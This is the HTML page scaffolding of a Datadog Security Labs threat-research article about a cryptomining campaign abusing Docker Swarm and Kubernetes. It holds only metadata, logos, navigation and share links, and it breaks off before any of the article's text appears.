



<!doctype html>
<html lang="en" itemtype="http://schema.org/Article">
  <head>
    <title>
  Threat Actors leverage Docker Swarm and Kubernetes to mine cryptocurrency at scale |  Datadog Security Labs
</title>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Analyzing a campaign where a threat actor leveraged Docker Swam and Kubernetes to mine cryptocurrency">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Threat Actors leverage Docker Swarm and Kubernetes to mine cryptocurrency at scale">
    <meta name="twitter:site" content="@datadoghq">
    <meta name="twitter:creator" content="@datadoghq">
    <meta name="twitter:description" content="Analyzing a campaign where a threat actor leveraged Docker Swam and Kubernetes to mine cryptocurrency">
    <meta name="twitter:image" content="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?w=1200&h=630&auto=format">
    <meta property="og:title" content="Threat Actors leverage Docker Swarm and Kubernetes to mine cryptocurrency at scale |  Datadog Security Labs">
    <meta property="og:type" content="article" />
    <meta property="og:description" content="Analyzing a campaign where a threat actor leveraged Docker Swam and Kubernetes to mine cryptocurrency">
    <meta name="image" property="og:image" content="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?w=1200&h=630&auto=format">
    
    <link rel="shortcut icon" href="https://datadog-securitylabs.imgix.net/img/favicon.ico" type="image/x-icon">
    <link rel="preload" href="/assets/styles/styles-OIRYMJBK.css" as="style">
    <link rel="stylesheet" href="/assets/styles/styles-OIRYMJBK.css">
    <script src="/assets/scripts/main-FCVU64VZ.js"></script>
    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-WDC8G6');</script>
    <!-- End Google Tag Manager -->
    <meta name="ahrefs-site-verification" content="0e44dd9fee3fa1de786252e6fb86532d521bdc9fd44f5a759b11280bfde666e0">
  </head>

  <body class="article" id="/articles/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/">
    
<nav
  x-data="{
    mobile: false,
    mobileOpen: false,
    reactOnResize() {
      if (window.innerWidth < 835) {
        this.mobile = true;
      } else {
        this.mobile = false;
        this.mobileOpen = false;
      }        
    }
  }"
  x-init="reactOnResize()"
  @resize.window.throttle.200ms="reactOnResize"
  class="navbar"
>
  <div class="navbar-container">

    <div class="navbar-logo-container">
      <a class="navbar-logo-link" href="https://securitylabs.datadoghq.com">
        <svg class="navbar-logo-desktop"  width="180" height="44" viewBox="0 0 180 44" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M14.6834 11.5604C16.2023 10.5233 18.1604 10.9316 17.8325 11.2433C17.2079 11.838 18.0391 11.6629 18.1286 12.7614C18.1949 13.5707 17.9305 14.0174 17.7037 14.2709C17.23 14.3334 16.6532 14.4494 15.9596 14.6749C15.5487 14.8081 15.1913 14.9567 14.8788 15.1058C14.7963 15.0514 14.7071 14.9866 14.6009 14.8946C13.5278 13.965 13.5635 12.3247 14.6834 11.5604ZM23.758 17.9673C24.0332 17.753 25.2862 17.3501 26.4461 17.2123C27.0551 17.1397 27.9223 17.0994 28.1084 17.2022C28.4755 17.4056 28.4759 18.0344 28.2243 18.6155C27.8587 19.4605 27.3392 20.3916 26.7527 20.4693C25.796 20.5954 24.8892 20.0772 23.8549 19.3029C23.4859 19.0273 23.2595 18.3539 23.758 17.9673ZM25.5045 9.75029C26.9183 10.4086 26.7334 11.6619 26.7721 12.3978C26.783 12.609 26.7795 12.7518 26.7617 12.8504C26.5655 12.7441 26.2561 12.6664 25.7665 12.6878C25.6219 12.694 25.4824 12.7107 25.3471 12.7324C24.826 12.453 24.514 11.9045 24.2294 11.3231C24.2031 11.2695 24.1829 11.2214 24.1639 11.1744C24.1558 11.1531 24.1453 11.1294 24.1387 11.11C24.1352 11.0999 24.1321 11.091 24.129 11.0809C23.972 10.5836 24.0767 10.4843 24.1441 10.331C24.212 10.1749 24.4678 10.0453 24.0906 9.91448C24.0581 9.90322 24.0166 9.89468 23.972 9.8877C24.2209 9.57757 24.9706 9.50188 25.5045 9.75029ZM17.7965 24.7356C16.2726 23.7555 14.6972 22.3508 14.0083 21.5741C13.8924 21.4868 13.9114 21.0994 13.9114 21.0994C14.5332 21.5838 17.1143 23.4303 19.8422 24.2733C20.804 24.5706 22.281 24.6832 23.5623 23.9554C24.5419 23.3992 25.7208 22.4304 26.4233 21.4325L26.552 21.6564C26.5473 21.8055 26.2228 22.5278 26.0588 22.8182C26.3562 22.9897 26.5787 23.0359 26.9098 23.1275L29.1699 22.7747C29.9797 21.4631 30.562 19.3473 29.9429 17.3344C29.5881 16.1797 27.7448 13.8807 27.6126 13.7534C27.1486 13.3082 27.6898 11.5852 26.7714 9.70733C25.7999 7.72079 23.2719 5.64809 22.1725 4.74603C22.497 4.9828 24.4904 5.78704 25.4184 6.90956C25.5053 6.79351 25.5417 6.19072 25.6216 6.03856C24.8237 4.9929 24.7617 3.13096 24.7617 2.63374C24.7617 1.72159 24.2977 0.687183 24.2977 0.687183C24.2977 0.687183 25.0967 1.31909 25.3025 2.40861C25.5456 3.69881 26.0654 4.71459 26.7524 5.57356C28.0522 7.19524 29.2253 8.02743 29.82 7.42852C30.5298 6.70812 29.1005 3.48844 27.2722 1.69093C25.1424 -0.404674 24.5834 -0.134135 23.3324 0.313398C22.3345 0.66894 21.7953 3.50746 19.1933 3.45118C18.7521 3.40033 17.6171 3.37161 17.0561 3.37665C17.3488 2.96793 17.5988 2.65237 17.5988 2.65237C17.5988 2.65237 16.7262 3.00326 15.983 3.44924L15.9249 3.36229C16.1761 2.83247 16.4459 2.49866 16.4459 2.49866C16.4459 2.49866 15.7489 2.91864 15.1127 3.42051C15.2286 2.789 15.6667 2.38727 15.6667 2.38727C15.6667 2.38727 14.7855 2.54757 13.6629 3.78343C12.3867 4.13199 12.0796 4.36216 11.0636 4.81241C9.41134 4.45143 8.63097 3.86882 7.8886 2.79599C7.32222 1.97738 6.31623 1.85318 5.28581 2.27587C3.78671 2.89846 1.8887 3.74889 1.8887 3.74889C1.8887 3.74889 2.50587 3.72521 3.15133 3.75354C2.26939 4.08813 1.4204 4.54847 1.4204 4.54847C1.4204 4.54847 1.83366 4.53372 2.34382 4.54303C1.99105 4.83608 1.79644 4.97582 1.46189 5.19823C0.654379 5.78433 0 6.46203 0 6.46203C0 6.46203 0.548546 6.21168 1.03972 6.07194C0.696247 6.86144 0.0147313 7.4421 0.139559 8.40859C0.260123 9.29162 1.34132 11.1081 2.73808 12.2237C2.85864 12.3207 4.76634 14.0864 6.20458 13.3613C7.6432 12.6374 8.20958 11.9912 8.44606 11.001C8.7244 9.86336 8.56585 9.00478 7.97311 6.53656C7.77734 5.72184 7.26756 4.04504 7.02061 3.24313L7.07605 3.20237C7.54629 4.19642 8.7496 6.81602 9.23496 8.57472C9.99245 11.3189 9.7552 12.7108 9.40902 13.2208C8.36504 14.7598 5.68705 14.9632 4.469 14.1101C4.28331 17.0647 4.94234 18.3653 5.16525 19.0205C5.0536 19.7735 5.54128 21.172 5.54128 21.172C5.54128 21.172 5.59672 20.5358 5.81963 20.2009C5.87933 20.9488 6.25536 21.8361 6.25536 21.8361C6.25536 21.8361 6.23288 21.2881 6.40423 20.8145C6.64535 21.2229 6.82291 21.3207 7.05047 21.6273C7.27802 22.4261 7.73663 23.0103 7.73663 23.0103C7.73663 23.0103 7.66104 22.5822 7.7029 22.1358C8.81938 23.2102 9.01166 24.7771 9.12331 25.9804C9.43577 29.2924 3.90921 31.9241 2.83771 33.9948C2.02594 35.2206 1.54058 37.1625 2.91485 38.3056C6.23831 41.0688 4.96211 41.8296 6.6252 43.0433C8.90661 44.7085 11.7629 43.9632 12.7348 42.6078C14.0881 40.7203 13.74 38.9394 13.2376 37.2747C12.8449 35.9725 11.7777 33.8093 10.4553 32.9717C9.10664 32.1162 7.79478 31.9555 6.68257 32.0708L6.7853 31.9528C8.38442 31.6345 10.0553 31.8104 11.2655 32.5894C12.639 33.4736 13.8951 34.99 14.5522 37.3131C15.2969 37.2068 15.4031 37.1586 16.0838 37.0616L14.5483 25.0931L17.7965 24.7356ZM18.6826 39.7365L18.5058 38.0768L21.9583 32.8027L25.8784 33.9496L29.2499 28.3126L33.2906 30.9815L36.3616 24.5348L37.4529 36.2754L18.6826 39.7365ZM37.4948 22.1291L25.1554 24.3687C24.85 24.7635 24.0944 25.4559 23.7308 25.6364C22.172 26.4224 21.1187 26.1946 20.2088 25.9578C19.6242 25.8091 19.2854 25.7253 18.7985 25.5068L15.7867 25.9205L17.615 41.1922L38.7528 37.3782L37.4948 22.1291Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M51.0036 28.7055H55.3629C59.4687 28.7055 61.5218 26.2904 61.5218 21.4568C61.5218 17.3428 59.4687 15.2837 55.3629 15.2837H51.0036V28.7055ZM55.9165 31.8904H47.3359V12.1108H55.9165C62.0978 12.1108 65.1922 15.2288 65.1922 21.4609C65.1922 28.4126 62.0978 31.8904 55.9165 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M69.0341 31.8904H65.2676L73.6702 12.1108H77.6147L86.1984 31.8904H82.2543L79.7631 26.4956H73.4233L74.682 23.3155H78.7944L75.555 15.8856L69.0341 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M84.1265 12.1108H99.1458V15.2913H93.4715V31.8904H89.8042V15.2913H84.1265V12.1108Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M101.031 31.8904H97.2646L105.667 12.1108H109.611L118.195 31.8904H114.248L111.756 26.4956H105.416L106.675 23.3155H110.788L107.548 15.8856L101.031 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M124.298 28.7055H128.658C132.763 28.7055 134.819 26.2904 134.819 21.4568C134.819 17.3428 132.763 15.2837 128.658 15.2837H124.298V28.7055ZM129.211 31.8904H120.63V12.1108H129.211C135.396 12.1108 138.487 15.2288 138.487 21.4609C138.487 28.4126 135.396 31.8904 129.211 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M150.912 28.8433C154.896 28.8433 156.89 26.5436 156.89 21.9413C156.89 17.4112 154.896 15.1449 150.912 15.1449C146.823 15.1449 144.78 17.4112 144.78 21.9413C144.78 26.5436 146.823 28.8433 150.912 28.8433ZM140.971 22.0274C140.971 15.3198 144.286 11.9678 150.912 11.9678C157.437 11.9678 160.696 15.3198 160.696 22.0274C160.696 28.6953 157.437 32.0307 150.912 32.0307C144.579 32.0307 141.268 28.6953 140.971 22.0274Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M176.002 23.885V28.5168C175.155 28.738 174.397 28.8467 173.731 28.8467C169.247 28.8467 167.006 26.4716 167.006 21.7238C167.006 17.3386 169.382 15.1486 174.134 15.1486C176.117 15.1486 177.962 15.5178 179.67 16.2568V12.9343C177.962 12.2911 176.025 11.9678 173.857 11.9678C166.752 11.9678 163.197 15.2173 163.197 21.7238C163.197 28.5929 166.69 32.0307 173.675 32.0307C176.078 32.0307 178.074 31.681 179.67 30.9784V20.6316H173.745L172.506 23.885H176.002Z" />
</svg>

        <svg class="navbar-logo-mobile"  width="29" height="32" viewBox="0 0 29 32" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M10.6801 8.40742C11.7847 7.65314 13.2088 7.95011 12.9703 8.17679C12.5161 8.60925 13.1205 8.48194 13.1857 9.28082C13.2339 9.86939 13.0416 10.1943 12.8767 10.3786C12.5321 10.4241 12.1126 10.5085 11.6082 10.6725C11.3094 10.7693 11.0494 10.8774 10.8222 10.9858C10.7621 10.9463 10.6973 10.8992 10.62 10.8323C9.83961 10.1562 9.86555 8.96324 10.6801 8.40742ZM17.2781 13.0644C17.4783 12.9086 18.3895 12.6156 19.2331 12.5154C19.676 12.4626 20.3067 12.4332 20.442 12.508C20.709 12.6559 20.7093 13.1133 20.5263 13.5358C20.2605 14.1504 19.8827 14.8276 19.4561 14.8841C18.7603 14.9758 18.1008 14.5989 17.3486 14.0358C17.0802 13.8354 16.9156 13.3456 17.2781 13.0644ZM18.5491 7.09223C19.5773 7.57099 19.4428 8.4825 19.471 9.01772C19.4789 9.17128 19.4764 9.27516 19.4634 9.34687C19.3207 9.26952 19.0958 9.21306 18.7397 9.22859C18.6345 9.2331 18.533 9.24524 18.4346 9.26105C18.0557 9.0578 17.8287 8.65893 17.6218 8.23606C17.6026 8.19711 17.5879 8.1621 17.5741 8.12794C17.5682 8.11242 17.5606 8.0952 17.5558 8.08108C17.5533 8.07374 17.551 8.06725 17.5488 8.05991C17.4346 7.6983 17.5107 7.62604 17.5598 7.51453C17.6091 7.40105 17.7952 7.30677 17.5208 7.21164C17.4972 7.20345 17.467 7.19724 17.4346 7.19216C17.6156 6.96661 18.1608 6.91156 18.5491 7.09223ZM12.9429 17.9895C11.8346 17.2767 10.6888 16.2551 10.1878 15.6903C10.1035 15.6268 10.1174 15.345 10.1174 15.345C10.5696 15.6973 12.4467 17.0402 14.4307 17.6533C15.1302 17.8696 16.2044 17.9514 17.1362 17.4221C17.8487 17.0176 18.706 16.313 19.2169 15.5872L19.3105 15.7501C19.3071 15.8585 19.0711 16.3839 18.9519 16.595C19.1681 16.7198 19.33 16.7534 19.5707 16.82L21.2144 16.5634C21.8034 15.6095 22.2269 14.0708 21.7766 12.6068C21.5187 11.767 20.178 10.095 20.0819 10.0024C19.7444 9.67867 20.138 8.42559 19.4701 7.05987C18.7636 5.61512 16.925 4.1077 16.1255 3.45166C16.3614 3.62386 17.8112 4.20876 18.4861 5.02514C18.5493 4.94073 18.5758 4.50234 18.6339 4.39168C18.0536 3.6312 18.0085 2.27706 18.0085 1.91545C18.0085 1.25207 17.671 0.49977 17.671 0.49977C17.671 0.49977 18.2521 0.959336 18.4018 1.75172C18.5786 2.69005 18.9567 3.4288 19.4563 4.0535C20.4016 5.2329 21.2548 5.83813 21.6873 5.40256C22.2035 4.87863 21.164 2.53705 19.8344 1.22977C18.2854 -0.294308 17.8788 -0.097553 16.969 0.227926C16.2433 0.486502 15.8511 2.55088 13.9588 2.50995C13.6379 2.47297 12.8124 2.45208 12.4044 2.45575C12.6173 2.1585 12.7992 1.929 12.7992 1.929C12.7992 1.929 12.1645 2.18419 11.624 2.50854L11.5817 2.4453C11.7644 2.05998 11.9607 1.81721 11.9607 1.81721C11.9607 1.81721 11.4537 2.12265 10.9911 2.48765C11.0754 2.02836 11.394 1.73619 11.394 1.73619C11.394 1.73619 10.7531 1.85278 9.93663 2.75159C9.00849 3.00508 8.7852 3.17248 8.04624 3.49993C6.84461 3.2374 6.27707 2.81369 5.73716 2.03344C5.32525 1.4381 4.59362 1.34776 3.84423 1.65518C2.75397 2.10797 1.3736 2.72646 1.3736 2.72646C1.3736 2.72646 1.82245 2.70924 2.29188 2.72985C1.65047 2.97318 1.03302 3.30798 1.03302 3.30798C1.03302 3.30798 1.33357 3.29725 1.7046 3.30402C1.44803 3.51715 1.3065 3.61878 1.06319 3.78053C0.475912 4.20678 0 4.69966 0 4.69966C0 4.69966 0.398943 4.51758 0.756158 4.41596C0.506361 4.99013 0.0107136 5.41244 0.101498 6.11534C0.189181 6.75754 0.975506 8.07865 1.99133 8.88995C2.07901 8.96052 3.46643 10.2447 4.51242 9.71734C5.55869 9.19087 5.97061 8.72086 6.14259 8.00074C6.34502 7.17335 6.22971 6.54893 5.79862 4.75386C5.65625 4.16133 5.2855 2.94185 5.1059 2.35864L5.14622 2.329C5.48821 3.05194 6.36335 4.95711 6.71633 6.23616C7.26724 8.23194 7.09469 9.24422 6.84292 9.61515C6.08366 10.7344 4.13603 10.8823 3.25018 10.2619C3.11514 12.4107 3.59443 13.3566 3.75655 13.8331C3.67535 14.3807 4.03003 15.3978 4.03003 15.3978C4.03003 15.3978 4.07034 14.9352 4.23246 14.6915C4.27588 15.2355 4.54936 15.8808 4.54936 15.8808C4.54936 15.8808 4.533 15.4822 4.65762 15.1378C4.83299 15.4348 4.96211 15.5059 5.12761 15.729C5.29311 16.3099 5.62664 16.7348 5.62664 16.7348C5.62664 16.7348 5.57166 16.4234 5.60211 16.0988C6.41409 16.8801 6.55394 18.0197 6.63513 18.8948C6.86238 21.3036 2.84307 23.2175 2.06379 24.7235C1.47341 25.615 1.12042 27.0273 2.11989 27.8586C4.53695 29.8682 3.60881 30.4215 4.81833 31.3042C6.47753 32.5152 8.55485 31.9733 9.26167 30.9875C10.2459 29.6147 9.99274 28.3196 9.62735 27.1089C9.34174 26.1618 8.56557 24.5886 7.60387 23.9794C6.62301 23.3572 5.66893 23.2404 4.86005 23.3242L4.93477 23.2384C6.09776 23.0069 7.31291 23.1348 8.19313 23.7014C9.19203 24.3444 10.1055 25.4473 10.5834 27.1368C11.125 27.0595 11.2023 27.0245 11.6973 26.9539L10.5806 18.2495L12.9429 17.9895ZM13.5871 28.8937L13.4585 27.6866L15.9694 23.8509L18.8204 24.6851L21.2724 20.5854L24.2111 22.5264L26.4446 17.8379L27.2382 26.3765L13.5871 28.8937ZM27.2691 16.0879L18.295 17.7167C18.0729 18.0038 17.5234 18.5074 17.2589 18.6387C16.1252 19.2103 15.3592 19.0446 14.6975 18.8724C14.2724 18.7643 14.0259 18.7033 13.6718 18.5444L11.4814 18.8453L12.8111 29.9519L28.184 27.1782L27.2691 16.0879Z"/>
</svg>

        <p class="navbar-logo-title">Security Labs</p>
      </a>
    </div>

    <div class="navbar-menu-container">
      <span x-cloak x-show="mobile " class="navbar-menu-icon-container">
        <span x-show="!mobileOpen" @click="mobileOpen = true">
          <svg class="navbar-menu-icon"  width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M29.3333 14.6667H2.66663V17.3334H29.3333V14.6667ZM29.3333 5.33337H2.66663V8.00004H29.3333V5.33337ZM29.3333 24H2.66663V26.6667H29.3333V24Z"/>
</svg>

        </span>
        <span x-show="mobileOpen" @click="mobileOpen = false">
          <svg class="navbar-menu-icon"  focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"/>
</svg>

        </span>
      </span>

      <div x-show="!mobile || (mobile && mobileOpen)" class="navbar-menu-list-container">
        <ul class="navbar-menu-list">
          
            <li class="navbar-menu-item  ">
  <a href="/articles/" title="ARTICLES" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">ARTICLES</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="/cloud-security-atlas/" title="CLOUD SECURITY ATLAS" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">CLOUD SECURITY ATLAS</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="/newsletters/" title="NEWSLETTER" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">NEWSLETTER</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="/about/" title="ABOUT" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">ABOUT</span>
    
  </a>
</li>
          
        </ul>
      </div>
    </div>

  </div>
</nav>
    
<header class="hero !bg-none !pb-15 !text-black">
  <div class="container">
    <p class="hero-category">research</p>

    <span class="block pb-1 tablet:pb-2 desktop:pb-3"></span>

    <h1 class="hero-title w-11/12">Threat Actors leverage Docker Swarm and Kubernetes to mine cryptocurrency at scale</h1>

    <span class="block pb-4 tablet:pb-2 desktop:pb-3"></span>

    <p class="hero-date">September 23, 2024</p>

    <span class="block pb-6 tablet:pb-8 desktop:pb-9"></span>

    <ul class="badge-list">
      
      <li class="inline-flex">




<a href="/articles/?tag=threat_research" aria-label="threat research" class="inline-flex" data-custom-name="Search filter tag button">
  <span class="badge badge-clickable badge-clickable-purple">
    threat research
  </span>
</a></li>
      
    </ul>

    <span class="block pb-4 tablet:pb-6"></span>

    <div class="share-article">
  <ul class="flex gap-3 desktop:gap-4">
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fthreat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency%2F&amp;text=Threat%20Actors%20leverage%20Docker%20Swarm%20and%20Kubernetes%20to%20mine%20cryptocurrency%20at%20scale" title="twitter" data-custom-name="Social link">
          <svg class="fill-blue-1 hover:fill-blue-2 active:fill-blue-1"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="20" cy="20" r="20"/>
<g clip-path="url(#clip0_37_5902)">
<path d="M32.9092 13.3016C32.01 13.693 31.0567 13.9458 30.0817 14.0513C31.1112 13.4379 31.8818 12.4703 32.2492 11.3299C31.2957 11.9088 30.2509 12.322 29.1592 12.5519C28.486 11.8187 27.6064 11.3066 26.6363 11.083C25.6662 10.8594 24.6511 10.9347 23.7247 11.2991C22.7983 11.6636 22.004 12.2999 21.4465 13.1245C20.8891 13.949 20.5945 14.9229 20.6017 15.9181C20.6016 16.2966 20.6444 16.6738 20.7292 17.0427C18.7718 16.9435 16.8571 16.4344 15.109 15.5484C13.361 14.6625 11.8185 13.4194 10.5817 11.8996C10.142 12.6499 9.91154 13.5042 9.91418 14.3737C9.90958 15.1884 10.1072 15.9916 10.4894 16.7112C10.8716 17.4309 11.4265 18.0445 12.1042 18.4971C11.3153 18.4784 10.5429 18.2674 9.85418 17.8823V17.9423C9.85385 19.0784 10.2464 20.1797 10.9654 21.0596C11.6843 21.9395 12.6855 22.5439 13.7992 22.7705C13.3763 22.8854 12.9399 22.9433 12.5017 22.9429C12.192 22.9434 11.883 22.9133 11.5792 22.8529C11.8923 23.8314 12.5041 24.6872 13.3287 25.3003C14.1532 25.9135 15.1492 26.2531 16.1767 26.2716C14.4307 27.64 12.2753 28.3819 10.0567 28.3783C9.67264 28.3676 9.28951 28.3351 8.90918 28.2808C11.1581 29.7303 13.7784 30.4983 16.4542 30.4925C25.5142 30.4925 30.4642 22.9954 30.4642 16.4879C30.4642 16.278 30.4642 16.0605 30.4642 15.8506C31.4253 15.1541 32.2534 14.2907 32.9092 13.3016Z" fill="white"/>
</g>
<defs>
<clipPath id="clip0_37_5902">
<rect width="24" height="19.5" fill="white" transform="translate(10 11)"/>
</clipPath>
</defs>
</svg>

          <span class="sr-only">twitter</span>
        </a>
      </li>
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fthreat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency%2F" title="reddit" data-custom-name="Social link">
          <svg class="fill-orange-3 hover:fill-orange-4 active:fill-orange-3"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M20 40C31.0457 40 40 31.0457 40 20C40 8.95431 31.0457 0 20 0C8.95431 0 0 8.95431 0 20C0 31.0457 8.95431 40 20 40Z"/>
<path d="M33.3304 20.0001C33.3318 19.4272 33.1645 18.8666 32.8493 18.3882C32.5341 17.9099 32.085 17.5349 31.558 17.3103C31.031 17.0856 30.4495 17.0211 29.8861 17.1249C29.3227 17.2287 28.8024 17.4961 28.39 17.8938C26.3985 16.4569 23.651 15.5278 20.5899 15.4202L21.9192 9.16929L26.2604 10.0914C26.2837 10.5985 26.4911 11.0797 26.8438 11.4447C27.1966 11.8098 27.6703 12.0336 28.1764 12.0743C28.6824 12.115 29.1858 11.9697 29.5923 11.6656C29.9988 11.3616 30.2805 10.9197 30.3844 10.4228C30.4883 9.92592 30.4075 9.40819 30.1569 8.96669C29.9064 8.52519 29.5034 8.19025 29.0235 8.02468C28.5436 7.85911 28.0199 7.87427 27.5504 8.06733C27.0809 8.26039 26.6979 8.61809 26.4734 9.07334L21.6267 8.04128C21.4914 8.01286 21.3503 8.03928 21.2345 8.11475C21.1186 8.19022 21.0375 8.30856 21.0088 8.44381L19.5251 15.4178C16.4195 15.5044 13.6299 16.4358 11.6103 17.8892C11.3036 17.5961 10.9366 17.3735 10.5349 17.2369C10.1332 17.1004 9.70661 17.0533 9.28482 17.0987C8.86303 17.1442 8.45627 17.2813 8.09295 17.5003C7.72963 17.7193 7.41853 18.0151 7.18137 18.3668C6.94422 18.7186 6.78674 19.1179 6.71994 19.5368C6.65314 19.9557 6.67863 20.3842 6.79463 20.7923C6.91063 21.2003 7.11434 21.5782 7.39153 21.8993C7.66871 22.2205 8.01268 22.4772 8.39941 22.6516C8.35065 22.9425 8.32406 23.2367 8.31984 23.5316C8.31984 28.0202 13.5433 31.657 19.9885 31.657C26.4336 31.657 31.6547 28.0202 31.6547 23.5316C31.6545 23.2385 31.6318 22.9459 31.5869 22.6563C32.1032 22.4296 32.5427 22.058 32.8522 21.5865C33.1616 21.1151 33.3277 20.564 33.3304 20.0001ZM13.3327 22.0829C13.3322 21.6704 13.4542 21.267 13.683 20.9238C13.9118 20.5806 14.2373 20.313 14.6183 20.1548C14.9993 19.9966 15.4186 19.955 15.8233 20.0352C16.2279 20.1154 16.5997 20.3138 16.8915 20.6053C17.1834 20.8968 17.3822 21.2684 17.4628 21.6729C17.5435 22.0775 17.5023 22.4969 17.3446 22.878C17.1868 23.2592 16.9196 23.585 16.5766 23.8142C16.2337 24.0434 15.8304 24.1658 15.4179 24.1658C14.8655 24.1652 14.3358 23.9456 13.945 23.5552C13.5541 23.1648 13.3339 22.6354 13.3327 22.0829ZM24.9498 27.5896C23.5293 29.0078 20.8029 29.1201 20.0025 29.1201C19.2021 29.1201 16.4757 29.0078 15.0552 27.5896C14.9537 27.4881 14.8967 27.3505 14.8967 27.207C14.8967 27.0635 14.9537 26.9258 15.0552 26.8243C15.1566 26.7229 15.2943 26.6658 15.4378 26.6658C15.5813 26.6658 15.7189 26.7229 15.8204 26.8243C16.7168 27.7207 18.6288 28.0389 20.0025 28.0389C21.3762 28.0389 23.2906 27.7207 24.1869 26.8243C24.2365 26.7714 24.2963 26.7291 24.3626 26.6998C24.4289 26.6704 24.5005 26.6548 24.573 26.6537C24.6455 26.6526 24.7175 26.666 24.7847 26.6933C24.8518 26.7206 24.9128 26.7612 24.964 26.8125C25.0152 26.8639 25.0556 26.925 25.0827 26.9923C25.1098 27.0595 25.123 27.1316 25.1217 27.2041C25.1204 27.2766 25.1045 27.3481 25.075 27.4143C25.0454 27.4805 25.0029 27.5402 24.9498 27.5896ZM24.5848 24.1681C24.1722 24.1686 23.7687 24.0466 23.4254 23.8177C23.0821 23.5887 22.8145 23.2631 22.6564 22.882C22.4983 22.5009 22.4568 22.0814 22.5372 21.6767C22.6176 21.272 22.8162 20.9002 23.108 20.6085C23.3997 20.3167 23.7715 20.1181 24.1762 20.0377C24.5809 19.9573 25.0004 19.9988 25.3815 20.1569C25.7626 20.315 26.0882 20.5827 26.3172 20.9259C26.5461 21.2692 26.6681 21.6727 26.6676 22.0853C26.6664 22.6373 26.4465 23.1664 26.0562 23.5567C25.6658 23.947 25.1368 24.1669 24.5848 24.1681Z" fill="white"/>
</svg>

          <span class="sr-only">reddit</span>
        </a>
      </li>
    
  </ul>
</div>
  </div>
</header>

  
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;h=712&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;h=712&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;h=712&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;h=712&dpr=1.75"
        alt="Threat Actors Leverage Docker Swarm And Kubernetes To Mine Cryptocurrency At Scale"
        class="mx-auto max-h-[712px]"
        loading="eager"
    />
</figure>


  



    <main>
      
<div class="container py-8 tablet:py-12 desktop:py-15">
  <article class="grid grid-cols-12 desktop:gap-x-10 relative">
    <aside class="article-toc hidden desktop:flex desktop:flex-col desktop:justify-between desktop:col-span-4">
      

<nav class="article-toc-nav text-20 leading-28 text-gray-50">
  
    <div class="flex items-center mb-4">
      <span class="inline-block mr-2"><svg class="w-[18px] h-[18px] fill-black"  xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192" width="192" height="192">
  <path d="M176,160H68V144H176Zm0-72H68v16H176Zm0-56H68V48H176ZM44,26H16V54H44Zm0,56H16v28H44Zm0,56H16v28H44Z"/>
</svg>
</span><p class="font-roboto-mono font-light uppercase text-sm">on this page<p>
    </div>
    <nav class="article-toc-nav" >
